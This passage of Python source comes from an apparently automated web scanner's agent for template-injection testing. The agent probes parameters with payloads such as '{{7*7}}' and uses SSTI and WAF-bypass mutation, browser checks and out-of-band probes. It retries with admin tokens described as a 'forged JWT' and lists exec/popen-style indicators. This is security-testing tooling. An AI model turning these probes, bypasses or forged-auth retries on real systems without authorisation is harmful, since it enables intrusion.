                        evidence["level"] = "L3"
                        first_finding = self._create_finding(param, payload, "L3_llm_bombing", verified_url=verified_url)
                        first_finding.evidence = evidence
                    if len(confirmed_payloads) >= 5:
                        break
                    continue

                if payload in response or ("49" in response and "49" not in baseline_html):
                    reflecting.append(payload)

        if first_finding:
            first_finding.successful_payloads = confirmed_payloads
            logger.info(f"[{self.name}] L3: {len(confirmed_payloads)} confirmed, {len(reflecting)} reflecting for '{param}'")
            return first_finding, reflecting

        logger.info(f"[{self.name}] L3: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
        return None, reflecting

    async def _escalation_l4_http_manipulator(self, url: str, param: str) -> tuple:
        """L4: ManipulatorOrchestrator - context detection, WAF bypass for SSTI."""
        reflecting = []
        try:
            parsed = urlparse(url)
            base_params = dict(parse_qs(parsed.query, keep_blank_values=True))
            # parse_qs returns lists, flatten to single values
            base_params = {k: v[0] if v else "" for k, v in base_params.items()}
            if param not in base_params:
                base_params[param] = "{{7*7}}"

            base_request = MutableRequest(
                method="GET",
                url=url.split("?")[0],
                params=base_params
            )

            manipulator = ManipulatorOrchestrator(
                rate_limit=0.3,
                enable_agentic_fallback=True,
                enable_llm_expansion=True
            )

            success, mutation = await manipulator.process_finding(
                base_request,
                strategies=[MutationStrategy.SSTI_INJECTION, MutationStrategy.BYPASS_WAF]
            )

            if success and mutation:
                working_payload = mutation.params.get(param, str(mutation.params))
                original_value = base_params.get(param, "{{7*7}}")

                # Verify the TARGET param was actually mutated (not a different param)
                if working_payload == original_value:
                    logger.info(f"[{self.name}] L4: ManipulatorOrchestrator exploited different param, not '{param}'")
                    await manipulator.shutdown()
                    return None, reflecting

                # Verify payload contains CSTI/SSTI indicators
                csti_indicators = ["{{", "${", "<%", "#{", "#set", "#if", "#include",
                                   "7*7", "constructor", "__class__", "config",
                                   "lipsum", "range(", "dump(", "system(", "exec(",
                                   "popen(", "Runtime", "Process", "forName"]
                if not any(ind in working_payload for ind in csti_indicators):
                    logger.info(f"[{self.name}] L4: ManipulatorOrchestrator payload rejected (no CSTI syntax): {working_payload[:80]}")
                    await manipulator.shutdown()
                    return None, reflecting

                # FIX (2026-02-16): Re-verify template evaluation via HTTP.
                # ManipulatorOrchestrator may flag payloads that merely REFLECT in
                # error messages (e.g., Pydantic validation errors) as "success".
                # Re-send the payload and verify with _check_csti_confirmed() to
                # confirm the template was actually EVALUATED, not just reflected.
                verify_url = url.split("?")[0]
                verify_params = dict(base_params)
                verify_params[param] = working_payload
                try:
                    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
                        async with session.get(verify_url, params=verify_params, timeout=15) as resp:
                            verify_body = await resp.text()
                        # Also fetch baseline for comparison
                        baseline_params = dict(base_params)
                        baseline_params[param] = "btai_baseline_test"
                        async with session.get(verify_url, params=baseline_params, timeout=15) as resp:
                            baseline_body = await resp.text()
                    confirmed, confirm_evidence = self._check_csti_confirmed(
                        working_payload, verify_body, baseline_body
                    )
                    if not confirmed:
                        logger.info(
                            f"[{self.name}] L4: ManipulatorOrchestrator payload REFLECTED but NOT EVALUATED "
                            f"(likely error message reflection): {working_payload[:80]}"
                        )
                        reflecting.append(working_payload)
                        await manipulator.shutdown()
                        return None, reflecting
                except Exception as verify_err:
                    logger.debug(f"[{self.name}] L4 verification request failed: {verify_err}")

                logger.info(f"[{self.name}] L4: ManipulatorOrchestrator CONFIRMED: {param}={working_payload[:80]}")
                await manipulator.shutdown()
                finding = self._create_finding(param, working_payload, "L4_manipulator", verified_url=url)
                finding.evidence = {"http_confirmed": True, "level": "L4", "method": "L4_manipulator"}
                return finding, reflecting

            # Collect blood smell candidates for L5
            if hasattr(manipulator, 'blood_smell_history') and manipulator.blood_smell_history:
                for entry in sorted(manipulator.blood_smell_history, key=lambda x: x["smell"]["severity"], reverse=True)[:5]:
                    blood_payload = entry["request"].params.get(param, "")
                    if blood_payload:
                        reflecting.append(blood_payload)
                logger.info(f"[{self.name}] L4: {len(reflecting)} blood smell candidates for L5")

            await manipulator.shutdown()

        except Exception as e:
            logger.error(f"[{self.name}] L4: ManipulatorOrchestrator failed: {e}")

        return None, reflecting

    async def _escalation_l5_browser(
        self, url: str, param: str, reflecting_payloads: list
    ) -> Optional[CSTIFinding]:
        """L5: Browser validation (Playwright) for client-side CSTI (Angular/Vue)."""
        seen = set()
        candidates = []
        for p in reflecting_payloads:
            if p not in seen:
                seen.add(p)
                candidates.append(p)

        candidates = candidates[:10]  # Limit to 10 browser tests (expensive)
        logger.info(f"[{self.name}] L5: Browser testing {len(candidates)} reflecting payloads on '{param}'")

        screenshots_dir = Path(settings.LOG_DIR) / "csti_screenshots"
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        confirmed_payloads = []
        first_finding = None

        for i, payload in enumerate(candidates):
            dashboard.set_current_payload(payload[:60], "CSTI L5 Browser", f"{i+1}/{len(candidates)}", self.name)
            try:
                evidence = {}
                if await self._validate_with_playwright(param, payload, screenshots_dir, evidence):
                    confirmed_payloads.append(payload)
                    if not first_finding:
                        logger.info(f"[{self.name}] L5: Playwright CONFIRMED: {payload[:60]}")
                        first_finding = self._create_finding(param, payload, "L5_browser")
                        first_finding.evidence = {**evidence, "playwright_confirmed": True, "level": "L5", "method": "L5_browser"}
                    if len(confirmed_payloads) >= 5:
                        break
            except Exception as e:
                logger.debug(f"[{self.name}] L5: Browser test {i+1} failed: {e}")

        if first_finding:
            first_finding.successful_payloads = confirmed_payloads
            logger.info(f"[{self.name}] L5: {len(confirmed_payloads)}/{len(candidates)} confirmed in browser for '{param}'")
            return first_finding

        logger.info(f"[{self.name}] L5: 0/{len(candidates)} confirmed in browser for '{param}'")
        return None

    async def _escalation_l6_cdp(
        self, url: str, param: str, reflecting_payloads: list
    ) -> Optional[CSTIFinding]:
        """L6: Flag best reflecting payload for CDP AgenticValidator."""
        if not reflecting_payloads:
            return None

        best_payload = reflecting_payloads[0]
        logger.info(f"[{self.name}] L6: Flagging '{param}' for CDP AgenticValidator (payload: {best_payload[:60]})")

        engine = self._detect_engine_from_payload(best_payload)
        engine_type = "client-side" if engine in ["angular", "vue"] else "server-side"

        return CSTIFinding(
            url=url,
            parameter=param,
            payload=best_payload,
            template_engine=engine,
            engine_type=engine_type,
            severity="MEDIUM",
            validated=False,
            status="NEEDS_CDP_VALIDATION",
            description=f"Potential {engine} CSTI: template syntax reflects. Best payload: {best_payload[:60]}. Flagged for CDP validation.",
            evidence={
                "method": "L6_cdp_flagged",
                "level": "L6",
                "reflecting_count": len(reflecting_payloads),
                "needs_cdp": True
            }
        )

    async def _generate_specialist_report(self, validated_findings: List[Dict]) -> None:
        """
        Generate specialist report for CSTI findings.

        Report structure:
        - phase_a: WET → DRY deduplication stats
        - phase_b: Exploitation results
        - findings: All validated CSTI findings
        """
        import json
        import aiofiles
        from bugtrace.core.config import settings

        # v3.1: Use unified report_dir if injected, else fallback to scan_context
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1] if "/" in self._scan_context else self._scan_context
            scan_dir = settings.BASE_DIR / "reports" / scan_id
        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)

        report = {
            "agent": f"{self.name}",
            "vulnerability_type": "CSTI",
            "scan_context": self._scan_context,
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(validated_findings) - len(self._dry_findings)),  # Approximate
                "dry_count": len(self._dry_findings),
                "deduplication_method": "LLM + fingerprint fallback"
            },
            "phase_b": {
                "exploited_count": len(self._dry_findings),
                "validated_count": len(validated_findings)
            },
            "findings": validated_findings,
            "summary": {
                "total_validated": len(validated_findings),
                "template_engines_found": list(set(f.get("template_engine", "unknown") for f in validated_findings))
            }
        }

        report_path = results_dir / "csti_results.json"

        async with aiofiles.open(report_path, "w") as f:
            await f.write(json.dumps(report, indent=2))

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

    # =========================================================================
    # Queue Consumption Mode (Phase 20)
    # =========================================================================

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        TWO-PHASE queue consumer (WET → DRY). NO infinite loop.

        Phase A: Drain ALL findings from queue and deduplicate
        Phase B: Exploit DRY list only

        Args:
            scan_context: Scan identifier for event correlation
        """
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_progress,
            report_specialist_done,
            report_specialist_wet_dry,
            write_dry_file,
        )
        from bugtrace.core.queue import queue_manager

        self._queue_mode = True
        self._scan_context = scan_context
        self._v = create_emitter("CSTI", self._scan_context)

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")

        # v3.2: Load context-aware tech stack for intelligent deduplication
        await self._load_csti_tech_context()

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("csti")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)

        self._v.emit("exploit.specialist.started", {"agent": "CSTI", "queue_depth": initial_depth})

        # PHASE A: Analyze and deduplicate
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        # Report WET→DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
        write_dry_file(self, dry_list, initial_depth, "csti")

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            report_specialist_done(self.name, processed=0, vulns=0)
            self._v.emit("exploit.specialist.completed", {"agent": "CSTI", "processed": 0, "vulns": 0})
            return  # Terminate agent

        # PHASE B: Exploit DRY findings
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities (only validated results, not all dry findings)
        vulns_count = len([r for r in results if r]) if results else 0

        # REPORTING: Generate specialist report
        if results or self._dry_findings:
            await self._generate_specialist_report(results)

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )

        self._v.emit("exploit.specialist.completed", {"agent": "CSTI", "processed": len(dry_list), "vulns": vulns_count})

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")

        # Method ends - agent terminates ✅

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_CSTI.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    async def _load_csti_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin to:
        1. Load tech_profile.json from report directory
        2. Detect likely template engines from framework/language
        3. Generate CSTI-specific prime directive for LLM prompts

        This context helps focus CSTI payloads on the detected template engines.
        """
        # Resolve report directory
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            # Fallback: construct from scan_context
            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._csti_prime_directive = ""
            return

        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._csti_prime_directive = self.generate_csti_context_prompt(self._tech_stack_context)

        lang = self._tech_stack_context.get("lang", "generic")
        frameworks = self._tech_stack_context.get("frameworks", [])
        waf = self._tech_stack_context.get("waf")

        # Detect engines for logging
        raw_profile = self._tech_stack_context.get("raw_profile", {})
        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        detected_engines = self._detect_template_engines(frameworks, tech_tags, lang)

        logger.info(f"[{self.name}] CSTI tech context loaded: lang={lang}, "
                   f"engines={detected_engines or ['unknown']}, waf={waf or 'none'}")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_csti notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def _process_queue_item(self, item: dict) -> Optional[CSTIFinding]:
        """
        Process a single item from the csti queue.

        Item structure (from ThinkingConsolidationAgent):
        {
            "finding": {
                "type": "CSTI",
                "url": "...",
                "parameter": "...",
                "template_engine": "...",  # Optional: detected engine
            },
            "priority": 85.5,
            "scan_context": "scan_123",
            "classified_at": 1234567890.0
        }
        """
        finding = item.get("finding", {})
        url = finding.get("url")
        param = finding.get("parameter")

        if not url or not param:
            logger.warning(f"[{self.name}] Invalid queue item: missing url or parameter")
            return None

        # Configure self for this specific test
        self.url = url

        # Run validation using existing CSTI testing logic
        return await self._test_single_param_from_queue(url, param, finding)

    async def _test_single_param_from_queue(
        self, url: str, param: str, finding: dict
    ) -> Optional[CSTIFinding]:
        """
        Test a single parameter from queue for CSTI.

        Uses existing validation pipeline optimized for queue processing.

        v3.2 FIX: Now tests the WET finding's payload FIRST before falling back
        to library payloads. DASTySAST often finds the right payload already.
        """
        try:
            # Use HTTPClientManager for proper connection management (v2.4)
            async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
                # Fetch page for template engine detection
                html = await self._fetch_page(session)

                # Detect template engine
                engines = TemplateEngineFingerprinter.fingerprint(html)

                # Use suggested engine from finding if available
                suggested_engine = finding.get("template_engine")
                if suggested_engine and suggested_engine != "unknown":
                    engines = [suggested_engine] + [e for e in engines if e != suggested_engine]

                # v3.2 FIX: Try the WET finding's payload FIRST
                # DASTySAST/Skeptic often identifies the correct payload already
                # v3.2.1: Also check 'recommended_payload' from LLM deduplication
                wet_payload = finding.get("payload") or finding.get("exploitation_strategy") or finding.get("recommended_payload")
                if wet_payload:
                    logger.info(f"[{self.name}] Testing WET payload first: {wet_payload[:50]}...")
                    result = await self._test_wet_finding_payload(session, param, wet_payload, engines)
                    if result:
                        return self._dict_to_finding(result)

                # Test with targeted payloads from library
                if engines and engines[0] != "unknown":
                    result = await self._targeted_probe(session, param, engines)
                    if result:
                        return self._dict_to_finding(result)

                # Universal probe
                result = await self._universal_probe(session, param)
                if result:
                    return self._dict_to_finding(result)

                # OOB probe if Interactsh available
                if not self.interactsh:
                    await self._setup_interactsh()
                if self.interactsh_url:
                    result = await self._oob_probe(session, param, engines)
                    if result:
                        return self._dict_to_finding(result)

            # If no result, retry with admin auth token (for admin-protected SSTI endpoints)
            try:
                from bugtrace.services.scan_context import get_scan_auth_headers
                auth_headers = get_scan_auth_headers(self._scan_context, role="admin")
                if auth_headers:
                    logger.info(f"[{self.name}] Retrying {url}?{param} with admin auth token")
                    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as auth_session:
                        # Inject auth headers into session
                        auth_session._default_headers = {**(auth_session._default_headers or {}), **auth_headers}
                        html = await self._fetch_page(auth_session)
                        engines = TemplateEngineFingerprinter.fingerprint(html)
                        result = await self._universal_probe(auth_session, param)
                        if result:
                            result["auth_required"] = True
                            result["description"] = f"SSTI on admin-protected endpoint (accessed via forged JWT). {result.get('description', '')}"
                            return self._dict_to_finding(result)
            except Exception as auth_err:
                logger.debug(f"[{self.name}] Auth retry failed: {auth_err}")

            return None

        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    async def _test_wet_finding_payload(
        self, session, param: str, payload: str, engines: List[str]
    ) -> Optional[Dict]:
        """
        Test the specific payload from WET finding.

        This prioritizes payloads that DASTySAST/Skeptic already identified
        as promising, rather than always starting from library payloads.

        v3.2.1 FIX: If payload has single quotes and fails (e.g., 500 error),
        try double-quote variants since some servers reject single quotes.
        """
        dashboard.set_current_payload(payload[:30] + "...", f"CSTI:{param}", "WET Payload")

        content, verified_url = await self._test_payload(session, param, payload)
        # v3.2.2 FIX: Use `is not None` instead of truthiness check
        # because JS-rendered sites return empty string "" which is falsy but valid
        if content is not None:
            # Determine engine from payload
            engine = self._detect_engine_from_payload(payload)
            if engine == "unknown" and engines:
                engine = engines[0]

            finding_obj = self._create_finding(param, payload, "wet_payload_validated", verified_url=verified_url)
            return self._finding_to_dict(finding_obj)

        # v3.2.1 FIX: Try double-quote variants if single-quote payload failed
        # Some servers (e.g., ginandjuice.shop) return 500 error for single quotes
        if "'" in payload:
            # Try replacing single quotes with double quotes
            dq_payload = payload.replace("'", '"')
            logger.info(f"[{self.name}] Single-quote payload failed, trying double-quote variant: {dq_payload[:50]}...")
            dashboard.set_current_payload(dq_payload[:30] + "...", f"CSTI:{param}", "WET DQ Variant")

            content, verified_url = await self._test_payload(session, param, dq_payload)
            if content is not None:
                engine = self._detect_engine_from_payload(dq_payload)
                if engine == "unknown" and engines:
                    engine = engines[0]
                finding_obj = self._create_finding(param, dq_payload, "wet_payload_validated_dq", verified_url=verified_url)
                return self._finding_to_dict(finding_obj)

            # Also try backtick variant for template literals
            bt_payload = payload.replace("'", '`')
            logger.info(f"[{self.name}] Double-quote also failed, trying backtick variant: {bt_payload[:50]}...")
            dashboard.set_current_payload(bt_payload[:30] + "...", f"CSTI:{param}", "WET BT Variant")

            content, verified_url = await self._test_payload(session, param, bt_payload)
            if content is not None:
                engine = self._detect_engine_from_payload(bt_payload)
                if engine == "unknown" and engines:
                    engine = engines[0]
                finding_obj = self._create_finding(param, bt_payload, "wet_payload_validated_bt", verified_url=verified_url)
                return self._finding_to_dict(finding_obj)

        return None

    def _dict_to_finding(self, result: Dict) -> Optional[CSTIFinding]:
        """Convert finding dict back to CSTIFinding object."""
        if not result:
            return None

        return CSTIFinding(
            url=result.get("url", self.url),
            parameter=result.get("parameter", ""),
            payload=result.get("payload", ""),
            template_engine=result.get("template_engine", "unknown"),
            engine_type=result.get("csti_metadata", {}).get("type", "unknown"),
            status=result.get("status", "VALIDATED_CONFIRMED"),
            validated=result.get("validated", True),
            description=result.get("description", ""),
            evidence=result.get("evidence", {}),
        )

    def _generate_csti_fingerprint(self, url: str, parameter: str, template_engine: str) -> tuple:
        """
        Generate CSTI finding fingerprint for expert deduplication.

        Client-side engines (angular, vue) share a page-level scope,
        so multiple params on the same page = one vulnerability.
        Server-side engines are param-specific.

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        parsed = urlparse(url)
        normalized_path = parsed.path.rstrip('/')

        client_side_engines = {"angular", "vue", "knockout", "ember", "react"}
        is_client_side = template_engine.lower() in client_side_engines

        if is_client_side:
            # Same page + same engine = same Angular/Vue scope = one finding
            fingerprint = ("CSTI", parsed.netloc, normalized_path, template_engine)
        else:
            # Server-side: each parameter is a separate injection point
            fingerprint = ("CSTI", parsed.netloc, normalized_path, parameter.lower(), template_engine)

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[CSTIFinding]) -> None:
        """
        Handle completed queue item processing.

        Emits vulnerability_detected event on confirmed findings.
        Uses centralized validation status to determine if CDP validation is needed.
        """
        if result is None:
            return

        # Use centralized validation status for proper tagging
        # Client-side CSTI (Angular, Vue) may need browser validation
        finding_data = {
            "context": result.engine_type,
            "payload": result.payload,
            "validation_method": result.template_engine,
            "evidence": result.evidence,
        }
        # Use centralized validation status for proper tagging
        # Client-side CSTI (Angular, Vue) may need browser validation
        finding_data = {
            "context": result.engine_type,
            "payload": result.payload,
            "validation_method": result.template_engine,
            "evidence": result.evidence,
        }
        needs_cdp = requires_cdp_validation(finding_data)

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        fingerprint = self._generate_csti_fingerprint(result.url, result.parameter, result.template_engine)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate CSTI finding (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        # Emit vulnerability_detected event with validation
        if settings.WORKER_POOL_EMIT_EVENTS:
            self._emit_csti_finding({
                "specialist": "csti",
                "type": "CSTI",
                "url": result.url,
                "parameter": result.parameter,
                "payload": result.payload,
                "template_engine": result.template_engine,
                "evidence": result.evidence if hasattr(result, 'evidence') else {},
                "status": result.status,
                "validation_requires_cdp": needs_cdp,
            }, scan_context=self._scan_context)

        logger.info(f"[{self.name}] Confirmed CSTI: {result.url}?{result.parameter} ({result.template_engine})")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
        }
